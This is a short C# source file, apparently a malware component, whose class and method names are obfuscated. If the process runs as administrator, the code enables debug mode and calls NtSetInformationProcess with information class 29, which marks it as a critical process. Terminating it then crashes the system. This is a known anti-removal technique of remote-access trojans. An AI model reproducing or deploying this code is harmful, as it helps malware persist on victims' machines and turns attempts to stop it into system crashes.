using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace dfbDZtGQEYGzK;

public static class sDEurotmlSp
{
	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr zmmpoRersK, int LVDmYGrHhRy, ref int MRoloebmcCznd, int CfjUkNQBMbrR);

	public static void aRIUYVwDTTlhpNC()
	{
		if (wUNkGYGntmxQr())
		{
			xHdDRbHAgWISJ();
		}
	}

	public static void xHdDRbHAgWISJ()
	{
		int MRoloebmcCznd = 1;
		Process.EnterDebugMode();
		NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref MRoloebmcCznd, 4);
	}

	public static bool wUNkGYGntmxQr()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}
}
